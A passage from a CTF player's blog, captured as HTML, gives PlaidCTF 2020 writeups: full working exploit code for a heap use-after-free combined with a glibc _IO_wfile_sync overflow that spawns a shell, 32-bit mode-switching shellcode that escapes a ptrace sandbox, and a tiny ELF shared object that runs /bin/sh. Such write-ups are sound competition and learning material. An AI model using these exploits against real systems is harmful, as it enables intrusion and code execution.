+  
+    <div class="date entry-date first">
+    <a href="https://ptr-yudai.hatenablog.com/archive/2020/04/20" rel="nofollow">
+      <time pubdate="" datetime="2020-04-20T01:53:00Z" title="2020-04-20T01:53:00Z">
+        <span class="date-year">2020</span><span class="hyphen">-</span><span class="date-month">04</span><span class="hyphen">-</span><span class="date-day">20</span>
+      </time>
+    </a>
+  </div>
+  <h1 class="entry-title">
+  <a href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300" class="entry-title-link bookmark">PlaidCTF 2020 Writeups</a>
+</h1>
+
+  
+  
+
+
+  
+
+  
+
+</header>
+
+    
+
+
+    <div class="entry-content">
+  
+    <p>I played PlaidCTF in shibad0gs and reached 38th place.</p>
+
+<p><span itemscope="" itemtype="http://schema.org/Photograph"><img src="./PlaidCTF 2020 Writeups - CTFするぞ_files/20200420105212.png" alt="f:id:ptr-yudai:20200420105212p:plain" title="f:id:ptr-yudai:20200420105212p:plain" class="hatena-fotolife" itemprop="image"></span></p>
+
+<p>I'm going to write up the challenges I solved during the CTF.
+I don't write about "YOU wa <a class="keyword" href="http://d.hatena.ne.jp/keyword/SHOCKWAVE">SHOCKWAVE</a>" as I mostly guessed the flag. (It was about disassembling <a class="keyword" href="http://d.hatena.ne.jp/keyword/shockwave">shockwave</a> media --&gt; finding input which satisfies 21 equations.)</p>
+
+<ul class="table-of-contents">
+    <li><a href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300#Pwnable-250pts-EmojiDB-26-solves">[Pwnable 250pts] EmojiDB (26 solves)</a></li>
+    <li><a href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300#Pwnable-200pts-sandybox-54-solves">[Pwnable 200pts] sandybox (54 solves)</a></li>
+    <li><a href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300#Misc-250pts-golfso-2-104-solves">[Misc 250pts] golf.so 2 (104 solves)</a></li>
+</ul>
+
+<h1 id="Pwnable-250pts-EmojiDB-26-solves">[Pwnable 250pts] EmojiDB (26 solves)</h1>
+
+<pre class="code" data-lang="" data-unlink="">Server: nc emojidb.pwni.ng 9876
+File: emojidb-efd43c685db20b699d7d7ded996d7dc475fbd9c0d0b8da4597254d16810fe97f.tar.gz</pre>
+
+
+<p>It seems a heap-exploit challenge.
+The input is converted from <a class="keyword" href="http://d.hatena.ne.jp/keyword/UTF-8">UTF-8</a> to <a class="keyword" href="http://d.hatena.ne.jp/keyword/unicode">unicode</a>.
+There're 4 choices:</p>
+
+<ul>
+<li>🆕：Create and write a note. (Maximum 4 notes, but can make 5th note by bug.)</li>
+<li>📖：Show a note. (Just checks the pointer and doesn't check <code>in_use</code> flag)</li>
+<li>🆓：Delete a note. (Set <code>in_use</code> flag to 0 but doesn't set the pointer to null.)</li>
+<li>🛑：Quit the program.</li>
+</ul>
+
+
+<p>You can easily find UAF in show function.
+Every note has <code>in_use</code> flag and it's set to 1 when created, to 0 when deleted.
+In show function doesn't check the flag, which causes UAF read.</p>
+
+<p>However, the address is recognized as <a class="keyword" href="http://d.hatena.ne.jp/keyword/unicode">unicode</a> and converted to <a class="keyword" href="http://d.hatena.ne.jp/keyword/UTF-8">UTF-8</a>, then leaked.
+I didn't know how to convert invalid <a class="keyword" href="http://d.hatena.ne.jp/keyword/unicode">unicode</a> to the original byte array.
+<a href="https://twitter.com/kaanezder">@aventador</a> told me libc uses <code>wcsnrtombs</code> to convert code.
+I wrote the following script to convert <a class="keyword" href="http://d.hatena.ne.jp/keyword/unicode">unicode</a> and <a class="keyword" href="http://d.hatena.ne.jp/keyword/UTF-8">UTF-8</a>.</p>
+
+<pre class="code lang-c" data-lang="c" data-unlink=""><span class="synPreProc">#include </span><span class="synConstant">&lt;stdio.h&gt;</span>
+<span class="synPreProc">#include </span><span class="synConstant">&lt;stdlib.h&gt;</span>
+<span class="synPreProc">#include </span><span class="synConstant">&lt;locale.h&gt;</span>
+<span class="synPreProc">#include </span><span class="synConstant">&lt;unistd.h&gt;</span>
+
+<span class="synType">int</span> main(<span class="synType">int</span> argc, <span class="synType">char</span> **argv) {
+  <span class="synType">int</span> i;
+  <span class="synType">unsigned</span> <span class="synType">char</span> out[<span class="synConstant">0x10</span>] = {<span class="synConstant">0</span>};
+  <span class="synType">unsigned</span> <span class="synType">char</span> in[<span class="synConstant">0x10</span>] = {<span class="synConstant">0</span>};
+  setlocale(<span class="synConstant">0</span>, <span class="synConstant">"en_US.UTF-8"</span>);
+
+  <span class="synStatement">if</span> (argc &lt; <span class="synConstant">2</span>) {
+    printf(<span class="synConstant">"Usage: </span><span class="synSpecial">%s</span><span class="synConstant"> [1|2]</span><span class="synSpecial">\n</span><span class="synConstant">"</span>, argv[<span class="synConstant">0</span>]);
+    <span class="synStatement">return</span> <span class="synConstant">1</span>;
+  }
+
+  <span class="synStatement">if</span> (argv[<span class="synConstant">1</span>][<span class="synConstant">0</span>] == <span class="synConstant">'1'</span>) {
+    read(<span class="synConstant">0</span>, in, <span class="synConstant">0x10</span>);
+    mbstowcs((<span class="synType">wchar_t</span>*)out, in, <span class="synConstant">0x10</span>);
+    write(<span class="synConstant">1</span>, out, <span class="synConstant">8</span>);
+  } <span class="synStatement">else</span> {
+    read(<span class="synConstant">0</span>, in, <span class="synConstant">8</span>);
+    wcstombs(out, (<span class="synType">wchar_t</span>*)in, <span class="synConstant">0x10</span>);
+    write(<span class="synConstant">1</span>, out, <span class="synConstant">0x10</span>);
+  }
+  <span class="synStatement">return</span> <span class="synConstant">0</span>;
+}
+</pre>
+
+
+<p>Leak is done, but how to pwn?</p>
+
+<p>He also found a critical information about a bug in libc-2.27.</p>
+
+<p><iframe src="./PlaidCTF 2020 Writeups - CTFするぞ_files/embed.html" title="20938 – In variable-width charsets, _IO_wfile_sync passes a negative buffer size to __codecvt_do_length on certain inputs to fgetws resulting in SIGSEGV" class="embed-card embed-webcard" scrolling="no" frameborder="0" style="display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;"></iframe><cite class="hatena-citation"><a href="https://sourceware.org/bugzilla/show_bug.cgi?id=20938">sourceware.org</a></cite></p>
+
+<p>This bug was reported in December 2016 but fixed in February 2020.
+Here is a simple PoC:</p>
+
+<pre class="code lang-c" data-lang="c" data-unlink=""><span class="synPreProc">#include </span><span class="synConstant">&lt;locale.h&gt;</span>
+<span class="synPreProc">#include </span><span class="synConstant">&lt;wchar.h&gt;</span>
+<span class="synPreProc">#include </span><span class="synConstant">&lt;stdlib.h&gt;</span>
+<span class="synPreProc">#include </span><span class="synConstant">&lt;stdio.h&gt;</span>
+
+<span class="synType">int</span> main(<span class="synType">void</span>) {
+  setlocale(<span class="synConstant">LC_ALL</span>, <span class="synConstant">"en_US.UTF-8"</span>);
+  <span class="synType">wchar_t</span> *buf = (<span class="synType">wchar_t</span>*)calloc(<span class="synStatement">sizeof</span>(<span class="synType">wchar_t</span>), <span class="synConstant">10</span>);
+  fgetws(buf, <span class="synConstant">10</span>, <span class="synConstant">stdin</span>);
+  exit(<span class="synConstant">0</span>); <span class="synComment">// call _IO_wfile_sync</span>
+}
+</pre>
+
+
+<p>It doesn't seem vulnerable at first glance.
+However, when we feed a large number of input in fgetws, it'll cause crash in <code>_IO_wfile_sync</code>.
+This is because <code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end</code> can be negative.</p>
+
+<p><code>fgetws</code> is used in the task too, but it doesn't cause crash because <code>wscanf</code> is used after that, which cansumes the input buffer.</p>
+
+<p>One more suspicious thing is 0xAE9.
+When we give an invalid choice, it just prints "😱" usually.
+If <code>dword_2020E0</code> is not zero, it prints our input to stderr.
+This is suspicious because there's no path to reach here normally.
+We can reach here by creating 5th chunk and overwrite <code>dword_2020E0</code>.</p>
+
+<p>So, what to do is obvious.
+We use <code>_IO_wfile_sync</code> of stderr to cause overwrite.
+As far as I experimented, the bug causes overflow in <code>_IO_wide_data_1</code>.
+Inside <code>_IO_wide_data</code> is a function pointer.</p>
+
+<p>I overwrote the pointer to <code>system</code> and prepared <code>/bin/sh</code> string in the place where rdi points, which is also in <code>_IO_wide_data</code>.</p>
+
+<p>My exploit:</p>
+
+<pre class="code lang-python" data-lang="python" data-unlink=""><span class="synPreProc">from</span> ptrlib <span class="synPreProc">import</span> *
+<span class="synPreProc">import</span> time
+
+<span class="synStatement">def</span> <span class="synIdentifier">show</span>(index):
+    sock.sendlineafter(b<span class="synConstant">"</span><span class="synSpecial">\xe2\x9d\x93</span><span class="synConstant">"</span>, <span class="synConstant">"</span><span class="synSpecial">\U0001f4d6</span><span class="synConstant">"</span>.encode(<span class="synConstant">'utf-8'</span>))
+    sock.recv(<span class="synConstant">9</span>).decode(<span class="synConstant">'utf-8'</span>)
+    sock.sendline(<span class="synIdentifier">str</span>(index))
+    <span class="synStatement">return</span> sock.recvline()<span class="synComment">#.decode('utf-8')</span>
+
+<span class="synStatement">def</span> <span class="synIdentifier">new</span>(size, data):
+    sock.sendafter(b<span class="synConstant">"</span><span class="synSpecial">\xe2\x9d\x93</span><span class="synConstant">"</span>, <span class="synConstant">"</span><span class="synSpecial">\U0001f195</span><span class="synConstant">"</span>.encode(<span class="synConstant">'utf-8'</span>))
+    sock.recv(<span class="synConstant">9</span>).decode(<span class="synConstant">'utf-8'</span>)
+    sock.send(<span class="synIdentifier">str</span>(size))
+    sock.sendline(data)
+    sock.recvline().decode(<span class="synConstant">'utf-8'</span>)
+
+<span class="synStatement">def</span> <span class="synIdentifier">free</span>(index):
+    sock.sendlineafter(b<span class="synConstant">"</span><span class="synSpecial">\xe2\x9d\x93</span><span class="synConstant">"</span>, <span class="synConstant">"</span><span class="synSpecial">\U0001f193</span><span class="synConstant">"</span>.encode(<span class="synConstant">'utf-8'</span>))
+    sock.recv(<span class="synConstant">9</span>).decode(<span class="synConstant">'utf-8'</span>)
+    sock.sendline(<span class="synIdentifier">str</span>(index))
+    sock.recvline().decode(<span class="synConstant">'utf-8'</span>)
+    sock.recv(<span class="synConstant">4</span>*<span class="synConstant">6</span>).decode(<span class="synConstant">'utf-8'</span>)
+
+<span class="synStatement">def</span> <span class="synIdentifier">flag</span>():
+    sock.sendlineafter(b<span class="synConstant">"</span><span class="synSpecial">\xe2\x9d\x93</span><span class="synConstant">"</span>, <span class="synConstant">"</span><span class="synSpecial">\U0001f6a9</span><span class="synConstant">"</span>.encode(<span class="synConstant">'utf-8'</span>))
+
+<span class="synStatement">def</span> <span class="synIdentifier">end</span>():
+    sock.sendlineafter(b<span class="synConstant">"</span><span class="synSpecial">\xe2\x9d\x93</span><span class="synConstant">"</span>, <span class="synConstant">"</span><span class="synSpecial">\U0001f6d1</span><span class="synConstant">"</span>.encode(<span class="synConstant">'utf-8'</span>))
+
+<span class="synStatement">def</span> <span class="synIdentifier">utf2uni</span>(x):
+    p = Process([<span class="synConstant">"./convert"</span>, <span class="synConstant">"1"</span>])
+    p.send(x)
+    y = p.recv()
+    p.close()
+    <span class="synStatement">return</span> y
+<span class="synStatement">def</span> <span class="synIdentifier">uni2utf</span>(x):
+    p = Process([<span class="synConstant">"./convert"</span>, <span class="synConstant">"2"</span>])
+    p.send(x)
+    y = p.recv().rstrip(b<span class="synConstant">'</span><span class="synSpecial">\x00</span><span class="synConstant">'</span>)
+    p.close()
+    <span class="synStatement">return</span> y
+
+libc = ELF(<span class="synConstant">"/lib/x86_64-linux-gnu/libc-2.27.so"</span>)
+
+<span class="synComment"># libc leak</span>
+<span class="synStatement">while</span> <span class="synIdentifier">True</span>:
+    <span class="synComment">#sock = Socket("localhost", 9876)</span>
+    sock = Socket(<span class="synConstant">"emojidb.pwni.ng"</span>, <span class="synConstant">9876</span>)
+
+    new(<span class="synConstant">0x110</span>, <span class="synConstant">"A"</span>)
+    new(<span class="synConstant">0x10</span>, <span class="synConstant">"B"</span>)
+    free(<span class="synConstant">1</span>)
+    x = show(<span class="synConstant">1</span>).strip(b<span class="synConstant">"</span><span class="synSpecial">\xf0\x9f\x86\x95\xf0\x9f\x93\x96\xf0\x9f\x86\x93\xf0\x9f\x9b\x91\xe2\x9d\x93\xf0\x9f\x98\xb1</span><span class="synConstant">"</span>)
+    <span class="synStatement">if</span> x[<span class="synConstant">0</span>] == <span class="synIdentifier">ord</span>(<span class="synConstant">'?'</span>):
+        logger.warn(<span class="synConstant">"Bad luck!"</span>)
+        sock.close()
+        <span class="synStatement">continue</span>
+
+    libc_base = u64(utf2uni(x[:<span class="synIdentifier">len</span>(x)//<span class="synConstant">2</span>])) - libc.main_arena() - <span class="synConstant">0x60</span>
+    logger.info(<span class="synConstant">"libc = "</span> + <span class="synIdentifier">hex</span>(libc_base))
+    <span class="synStatement">if</span> libc_base &lt; <span class="synConstant">0x7f0000000000</span>:
+        logger.warn(<span class="synConstant">"Bad luck!"</span>)
+        sock.close()
+        <span class="synStatement">continue</span>
+    <span class="synStatement">break</span>
+
+<span class="synComment"># stack overwrite</span>
+IO_wide_data = libc_base + <span class="synConstant">0x3eb9e8</span>
+system = libc_base + libc.symbol(<span class="synConstant">'system'</span>)
+logger.info(<span class="synConstant">"IO_wide_data = "</span> + <span class="synIdentifier">hex</span>(IO_wide_data))
+logger.info(<span class="synConstant">"system = "</span> + <span class="synIdentifier">hex</span>(system))
+<span class="synStatement">for</span> i <span class="synStatement">in</span> <span class="synIdentifier">range</span>(<span class="synConstant">4</span>):
+    new(<span class="synConstant">3</span>, <span class="synConstant">"A"</span>)
+payload = b<span class="synConstant">'A</span><span class="synSpecial">\0\0\0</span><span class="synConstant">'</span>*<span class="synConstant">3</span>
+payload += (uni2utf(p64(IO_wide_data)[:<span class="synConstant">4</span>]) + uni2utf(p64(IO_wide_data)[<span class="synConstant">4</span>:])) * <span class="synConstant">2</span>
+<span class="synStatement">for</span> i <span class="synStatement">in</span> <span class="synIdentifier">range</span>(<span class="synConstant">4</span>):
+    payload += (uni2utf(p64(IO_wide_data)[:<span class="synConstant">4</span>]) + uni2utf(p64(IO_wide_data)[<span class="synConstant">4</span>:])) * <span class="synConstant">2</span>
+payload += uni2utf(b<span class="synConstant">'/bin'</span>) + uni2utf(b<span class="synConstant">'/sh</span><span class="synSpecial">\0</span><span class="synConstant">'</span>)
+payload += uni2utf(p64(system)[:<span class="synConstant">4</span>]) + uni2utf(b<span class="synConstant">'</span><span class="synSpecial">\xfc\x7f\x00\x00</span><span class="synConstant">'</span>)
+payload += uni2utf(b<span class="synConstant">'</span><span class="synSpecial">\xfb\x7f\x00\x00</span><span class="synConstant">'</span>) + uni2utf(b<span class="synConstant">'</span><span class="synSpecial">\xfc\x7f\x00\x00</span><span class="synConstant">'</span>)
+payload += b<span class="synConstant">'2'</span> * <span class="synConstant">10</span>
+<span class="synIdentifier">print</span>(payload)
+sock.sendlineafter(b<span class="synConstant">"</span><span class="synSpecial">\xe2\x9d\x93</span><span class="synConstant">"</span>, payload)
+
+sock.interactive()
+</pre>
+
+
+<h1 id="Pwnable-200pts-sandybox-54-solves">[Pwnable 200pts] sandybox (54 solves)</h1>
+
+<pre class="code" data-lang="" data-unlink="">Server: nc sandybox.pwni.ng 1337
+File: sandbox</pre>
+
+
+<p>It's a ptrace sandbox.
+We can execute 10 bytes shellcode in the child process under some syscall restrictions.
+The following system calls are allowed:</p>
+
+<ul>
+<li>open: The length of filename must be less than 16 bytes. RSI must be O_RDONLY. Must not contain "flag", "proc", "sys" in the filename.</li>
+<li>alarm: RDI must be less than or equals to 20.</li>
+<li><a class="keyword" href="http://d.hatena.ne.jp/keyword/mmap">mmap</a> / mprotect / munmap: RSI (len) must be less than or equals to 0x1000.</li>
+<li>read / write / close / fstat / exit_group / exit / getpid: No restriction.</li>
+</ul>
+
+
+<p>Our goal is open / read and write the contents of <code>./flag</code>.
+A challenge from TokyoWestern CTF, Diary, hit my mind.
+It was about bypassing seccomp by changing CS register in shellcode.</p>
+
+<p>I checked 32-bit system call and BINGO!
+<code>fstat</code> is allowed and the number is 5, which is <code>open</code> in 32-bit.</p>
+
+<p>We can use <code>retf</code> to change 64-bit to 32-bit.
+I wrote the following shellcode that allocates buffer in 32-bit address space and reads next (32-bit) shellcode:</p>
+
+<pre class="code lang-nasm" data-lang="nasm" data-unlink=""><span class="synType">global</span> <span class="synIdentifier">_start</span>
+<span class="synIdentifier">_start</span>:
+  <span class="synStatement">mov</span> r9, <span class="synConstant">0</span>
+  <span class="synStatement">mov</span> r8, -<span class="synConstant">1</span>
+  <span class="synStatement">mov</span> r10, <span class="synConstant">0x21</span>
+  <span class="synStatement">mov</span> rdx, <span class="synConstant">7</span>
+  <span class="synStatement">mov</span> rsi, <span class="synConstant">0x1000</span>
+  <span class="synStatement">mov</span> rdi, <span class="synConstant">0x8880000</span>
+  <span class="synStatement">mov</span> rax, <span class="synConstant">9</span>
+  <span class="synSpecial">syscall</span>
+  <span class="synStatement">mov</span> rdi, <span class="synConstant">0x7770000</span>
+  <span class="synStatement">mov</span> rax, <span class="synConstant">9</span>
+  <span class="synSpecial">syscall</span>
+
+  <span class="synStatement">mov</span> rdx, <span class="synConstant">0x100</span>
+  <span class="synStatement">mov</span> rsi, <span class="synConstant">0x7770000</span>
+  <span class="synStatement">xor</span> edi, edi
+  <span class="synStatement">xor</span> eax, eax
+  <span class="synSpecial">syscall</span>
+  <span class="synStatement">mov</span> rsi, <span class="synConstant">0x7770800</span>
+  <span class="synStatement">xor</span> eax, eax
+  <span class="synSpecial">syscall</span>
+
+  <span class="synStatement">xor</span> rsp, rsp
+  <span class="synStatement">mov</span> esp, <span class="synConstant">0x8880800</span>
+  <span class="synStatement">mov</span> <span class="synType">DWORD</span> [esp+<span class="synConstant">4</span>], <span class="synConstant">0x23</span>
+  <span class="synStatement">mov</span> <span class="synType">DWORD</span> [esp], <span class="synConstant">0x7770000</span>
+  <span class="synStatement">retf</span>
+
+  <span class="synType">db</span> <span class="synConstant">'EOF'</span>
+</pre>
+
+
+<p>Then open the flag, read the contents, and return to 64-bit mode:</p>
+
+<pre class="code lang-nasm" data-lang="nasm" data-unlink="">  <span class="synType">global</span> <span class="synIdentifier">_start</span>:
+<span class="synIdentifier">_start</span>:
+  <span class="synStatement">xor</span> eax, eax
+  <span class="synStatement">push</span> eax
+  <span class="synStatement">mov</span> eax, <span class="synConstant">0x67616c66</span>
+  <span class="synStatement">push</span> eax
+  <span class="synStatement">xor</span> edx, edx
+  <span class="synStatement">xor</span> ecx, ecx
+  <span class="synStatement">mov</span> ebx, esp
+  <span class="synStatement">mov</span> eax, <span class="synConstant">5</span>
+  <span class="synStatement">int</span> <span class="synConstant">0x80</span>
+
+  <span class="synStatement">mov</span> edx, <span class="synConstant">0x100</span>
+  <span class="synStatement">mov</span> ecx, esp
+  <span class="synStatement">mov</span> ebx, eax
+  <span class="synStatement">mov</span> eax, <span class="synConstant">3</span>
+  <span class="synStatement">int</span> <span class="synConstant">0x80</span>
+
+  <span class="synStatement">push</span> eax
+  <span class="synStatement">push</span> eax
+  <span class="synStatement">mov</span> <span class="synType">DWORD</span> [esp+<span class="synConstant">4</span>], <span class="synConstant">0x33</span>
+  <span class="synStatement">mov</span> <span class="synType">DWORD</span> [esp], <span class="synConstant">0x7770800</span>
+  <span class="synStatement">retf</span>
+
+  <span class="synStatement">mov</span> eax, <span class="synConstant">1</span>
+  <span class="synStatement">int</span> <span class="synConstant">0x80</span>
+
+<span class="synIdentifier">hoge</span>:
+  <span class="synType">db</span> <span class="synConstant">'EOF'</span>
+</pre>
+
+
+<p>Here is the exploit:</p>
+
+<pre class="code lang-python" data-lang="python" data-unlink=""><span class="synPreProc">from</span> ptrlib <span class="synPreProc">import</span> *
+
+<span class="synComment">#sock = Socket("localhost", 9999)</span>
+sock = Socket(<span class="synConstant">"sandybox.pwni.ng"</span>, <span class="synConstant">1337</span>)
+
+shellcode  = b<span class="synConstant">'</span><span class="synSpecial">\xb2\xff</span><span class="synConstant">'</span>     <span class="synComment"># mov dl, 0xff</span>
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x48\x89\xde</span><span class="synConstant">'</span> <span class="synComment"># mov rsi, rbx</span>
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x31\xc0</span><span class="synConstant">'</span>     <span class="synComment"># xor eax, eax</span>
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x0f\x05</span><span class="synConstant">'</span>     <span class="synComment"># syscall</span>
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x90</span><span class="synConstant">'</span>
+sock.sendafter(<span class="synConstant">"&gt; "</span>, shellcode)
+
+<span class="synStatement">with</span> <span class="synIdentifier">open</span>(<span class="synConstant">"shellcode.o"</span>, <span class="synConstant">"rb"</span>) <span class="synStatement">as</span> f:
+    f.seek(<span class="synConstant">0x180</span>)
+    shellcode = f.read()
+shellcode = shellcode[:shellcode.index(b<span class="synConstant">'EOF'</span>)]
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x90</span><span class="synConstant">'</span> * (<span class="synConstant">0xff</span> - <span class="synIdentifier">len</span>(shellcode))
+sock.send(shellcode) <span class="synComment"># x64--&gt;x86</span>
+
+<span class="synStatement">with</span> <span class="synIdentifier">open</span>(<span class="synConstant">"shellcode32.o"</span>, <span class="synConstant">"rb"</span>) <span class="synStatement">as</span> f:
+    f.seek(<span class="synConstant">0x110</span>)
+    shellcode = f.read()
+shellcode = shellcode[:shellcode.index(b<span class="synConstant">'EOF'</span>)]
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x90</span><span class="synConstant">'</span> * (<span class="synConstant">0x100</span> - <span class="synIdentifier">len</span>(shellcode))
+sock.send(shellcode) <span class="synComment"># x86--&gt;x64</span>
+
+shellcode  = b<span class="synConstant">'</span><span class="synSpecial">\x48\xc7\xc2\x00\x01\x00\x00</span><span class="synConstant">'</span>
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x48\x89\xe6</span><span class="synConstant">'</span>
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x48\xc7\xc7\x01\x00\x00\x00</span><span class="synConstant">'</span>
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x48\xc7\xc0\x01\x00\x00\x00</span><span class="synConstant">'</span>
+shellcode += b<span class="synConstant">'</span><span class="synSpecial">\x0f\x05</span><span class="synConstant">'</span>
+sock.send(shellcode) <span class="synComment"># write</span>
+
+sock.interactive()
+</pre>
+
+
+<h1 id="Misc-250pts-golfso-2-104-solves">[Misc 250pts] golf.so 2 (104 solves)</h1>
+
+<p>The challenge is to make a 64-bit shared object which executes "<a class="keyword" href="http://d.hatena.ne.jp/keyword//bin/sh">/bin/sh</a>" when used like</p>
+
+<pre class="code" data-lang="" data-unlink="">$ LD_PRELOAD=golf.so /bin/true</pre>
+
+
+<p><a href="https://twitter.com/akiym">@akiym</a> wrote 223-byte binary and got the first flag.
+We needed to cut 30-byte off more in order to get the second flag.</p>
+
+<p>I re-wrote akiym's binary to nasm format.
+Then I found I could overlap <code>FINI</code> to <code>DYNAMIC</code> section, which dynamically reduces the size.</p>
+
+<pre class="code lang-nasm" data-lang="nasm" data-unlink="">  <span class="synStatement">BITS</span> <span class="synConstant">64</span>
+  <span class="synStatement">ORG</span> <span class="synConstant">0x00000000</span>
+
+  <span class="synType">db</span> <span class="synConstant">0x7f</span>, <span class="synConstant">"ELF"</span>                <span class="synComment">; e_ident</span>
+  <span class="synType">dd</span> <span class="synConstant">0x010102</span>
+  <span class="synType">dd</span> <span class="synConstant">0</span>
+  <span class="synType">dd</span> <span class="synConstant">0</span>
+  <span class="synType">dw</span> <span class="synConstant">3</span>                          <span class="synComment">; e_type</span>
+  <span class="synType">dw</span> <span class="synConstant">0x3e</span>                       <span class="synComment">; e_machine</span>
+  <span class="synType">dd</span> <span class="synConstant">1</span>                          <span class="synComment">; e_version</span>
+  <span class="synType">db</span> <span class="synConstant">'/bin/sh'</span>, <span class="synConstant">0</span>               <span class="synComment">; e_entry</span>
+  <span class="synType">dq</span> <span class="synConstant">0x40</span>                       <span class="synComment">; e_phoff</span>
+  <span class="synStatement">call</span> <span class="synIdentifier">b</span>                        <span class="synComment">; e_shoff</span>
+<span class="synIdentifier">b</span>:
+  <span class="synStatement">pop</span> rdi
+  <span class="synStatement">sub</span> rdi, <span class="synConstant">0x15</span>                 <span class="synComment">; +2 e_flags</span>
+  <span class="synStatement">xchg</span> esi, eax
+  <span class="synStatement">push</span> rax
+  <span class="synStatement">jmp</span> <span class="synIdentifier">c</span>                         <span class="synComment">; e_phsize</span>
+  <span class="synType">dw</span> <span class="synConstant">56</span>                         <span class="synComment">; e_phentsize</span>
+  <span class="synType">dw</span> <span class="synConstant">2</span>                          <span class="synComment">; e_phnum</span>
+<span class="synIdentifier">c</span>:
+  <span class="synStatement">push</span> rdi
+  <span class="synStatement">push</span> rsp                      <span class="synComment">; e_shentsize</span>
+  <span class="synStatement">mov</span> al, <span class="synConstant">59</span>                    <span class="synComment">; e_shnum</span>
+  <span class="synStatement">jmp</span> <span class="synIdentifier">d</span>                         <span class="synComment">; e_shstrndx</span>
+
+  <span class="synType">dd</span> <span class="synConstant">1</span>                          <span class="synComment">; LOAD</span>
+  <span class="synType">dd</span> <span class="synConstant">7</span>                          <span class="synComment">; rwx</span>
+  <span class="synType">dq</span> <span class="synConstant">0</span>
+  <span class="synType">dq</span> <span class="synConstant">0</span>
+<span class="synIdentifier">d</span>:
+  <span class="synStatement">pop</span> rsi
+  <span class="synStatement">xor</span> edx, edx
+  <span class="synSpecial">syscall</span>
+  <span class="synStatement">nop</span>
+  <span class="synStatement">nop</span>
+  <span class="synStatement">nop</span>
+  <span class="synType">dq</span> <span class="synConstant">0x1d0</span>
+  <span class="synType">dq</span> <span class="synConstant">0x1d0</span>
+  <span class="synType">dq</span> <span class="synConstant">0x200000</span>
+
+  <span class="synType">dd</span> <span class="synConstant">2</span>                          <span class="synComment">; DYNAMIC</span>
+  <span class="synType">dd</span> <span class="synConstant">7</span>                          <span class="synComment">; rwx</span>
+  <span class="synType">dq</span> <span class="synConstant">0xdeadbeefcafebabe</span>
+  <span class="synType">dq</span> <span class="synConstant">0x90</span>
+  <span class="synType">dq</span> <span class="synConstant">0xd</span>                        <span class="synComment">; FINI (overlap)</span>
+  <span class="synType">dq</span> <span class="synConstant">0x28</span>                       <span class="synComment">; address</span>
+  <span class="synType">dq</span> <span class="synConstant">5</span>
+  <span class="synType">dq</span> <span class="synConstant">0xdeadbeefcafebabe</span>
+  <span class="synType">db</span> <span class="synConstant">6</span>
+</pre>
+
+
+<p>177 bytes.</p>
+
+    
+
+  
+</div>
+
+    
+  <footer class="entry-footer">
+    
+    <p class="entry-footer-section">
+  <span class="author vcard"><span class="fn" data-load-nickname="1" data-user-name="ptr-yudai">ptr-yudai</span></span>
+  <span class="entry-footer-time"><a href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300"><time data-relative="" datetime="2020-04-20T01:53:00Z" title="2020-04-20T01:53:00Z" pubdate="" class="updated">3日前</time></a></span>
+</p>
+
+    
+  <div class="hatena-star-container">
+  <span class="hatena-star-comment-container"><img src="./PlaidCTF 2020 Writeups - CTFするぞ_files/comment.gif" tabindex="0" alt="Comments" title="Comments" class="hatena-star-comment-button" style="cursor: pointer; margin: 0px; padding: 0px; border: none; vertical-align: middle; display: none;"></span><span class="hatena-star-star-container"><img src="./PlaidCTF 2020 Writeups - CTFするぞ_files/hatena-star-add-button.svg" tabindex="0" alt="Add Star" title="Add Star" class="hatena-star-add-button" style="cursor: pointer; margin: 0px 3px; padding: 0px; border: none; vertical-align: middle;"></span></div>
+  <div class="hatena-star-metadata" style="display: none">
+    <a class="hatena-star-permalink" href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300">PlaidCTF 2020 Writeups</a>
+  </div>
+
+
+    
+<div class="social-buttons">
+  
+  
+    <div class="social-button-item">
+      <iframe class="hatena-bookmark-button-frame" title="この記事をはてなブックマークに追加" frameborder="0" scrolling="no" width="84" height="40" src="javascript:false" style="width: 84px; height: 40px;" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/saved_resource(1).html"></iframe>
+    </div>
+  
+  
+    <div class="social-button-item">
+      <div class="fb-share-button fb_iframe_widget" data-layout="box_count" data-href="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300" fb-xfbml-state="rendered" fb-iframe-plugin-query="app_id=719729204785177&amp;container_width=0&amp;href=https%3A%2F%2Fptr-yudai.hatenablog.com%2Fentry%2F2020%2F04%2F20%2F105300&amp;layout=box_count&amp;locale=ja_JP&amp;sdk=joey"><span style="vertical-align: bottom; width: 69px; height: 40px;"><iframe name="f3b98369399d86" width="1000px" height="1000px" data-testid="fb:share_button Facebook Social Plugin" title="fb:share_button Facebook Social Plugin" frameborder="0" allowtransparency="true" allowfullscreen="true" scrolling="no" allow="encrypted-media" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/share_button.html" style="border: none; visibility: visible; width: 69px; height: 40px;" class=""></iframe></span></div>
+    </div>
+  
+  
+    <div class="social-button-item">
+      <iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" allowfullscreen="true" class="twitter-share-button twitter-share-button-rendered twitter-tweet-button" style="position: static; visibility: visible; width: 75px; height: 20px;" title="Twitter Tweet Button" src="./PlaidCTF 2020 Writeups - CTFするぞ_files/tweet_button.6787510241df65d128e2b60207ad4c25.ja.html" data-url="https://ptr-yudai.hatenablog.com/entry/2020/04/20/105300"></iframe>
+    </div>
+  
+  
+  
+  
+</div>
+
+    
+  
+  
+    
+    <div class="google-afc-image test-google-rectangle-ads">      
+      
+      <div id="google_afc_user_container_0" class="google-afc-user-container google_afc_blocklink2_5 google_afc_boder" data-test-unit="/4374287/blog_user"></div>
+      
